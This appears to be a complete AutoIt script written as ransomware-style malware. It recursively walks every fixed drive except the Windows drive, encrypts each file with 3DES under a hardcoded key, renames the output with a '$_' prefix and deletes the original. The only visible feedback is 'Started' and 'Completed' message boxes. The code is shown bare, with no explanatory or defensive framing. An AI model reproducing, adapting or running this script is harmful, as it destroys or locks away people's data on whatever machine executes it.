#include <File.au3>
#include <Array.au3>
#include <Crypt.au3>

Dim $PTR_1,$PTR_2,$PTR_3,$Drives,$WinDir,$List,$FileName,$FileNameNew,$FilePath,$TempPath,$FileExt
$Drives = DriveGetDrive("FIXED")
$WinDir = StringLeft(@WindowsDir,2)

;CDTray(DriveGetDrive("CDROM")[1],"OPEN")
MsgBox("","","Started..........")
For $PTR_1 = 1 To $Drives[0] Step 1
   If $Drives[$PTR_1] <> $WinDir Then

	  $List = _FileListToArrayRec($Drives[$PTR_1],"*",$FLTAR_FILES+$FLTAR_NOSYSTEM,$FLTAR_RECUR,$FLTAR_FULLPATH)

	    For $PTR_2 = 1 To $List[0] Step 1
			$FileName = $Drives[$PTR_1] & "\" & $List[$PTR_2]
			$TempPath = StringSplit(StringReverse($FileName),"\")

			If StringLeft(StringReverse($TempPath[1]),2) <> "$_" Then
			   $FilePath = ""
			   For $PTR_3 = 2 To $TempPath[0] Step 1
				  $FilePath = $FilePath & "\" & $TempPath[$PTR_3]
			   Next
			   $FileExt = StringReverse(StringSplit($TempPath[1],".")[1])
			   $FilePath = StringReverse($FilePath)
			   $FileNameNew = $FilePath & "$_" & $FileExt & "_" & StringReverse(StringTrimLeft($TempPath[1],StringLen($FileExt)+1))
			   ;MsgBox("","Display",$FileNameNew)
			   _Crypt_EncryptFile($FileName,$FileNameNew,"YouCantTouchMeEvenThoughYouCan",$CALG_3DES)
			   FileDelete($FileName)
			EndIf

	    Next

   EndIf
Next
MsgBox("","","Completed..........")
;CDTray(DriveGetDrive("CDROM")[1],"OPEN")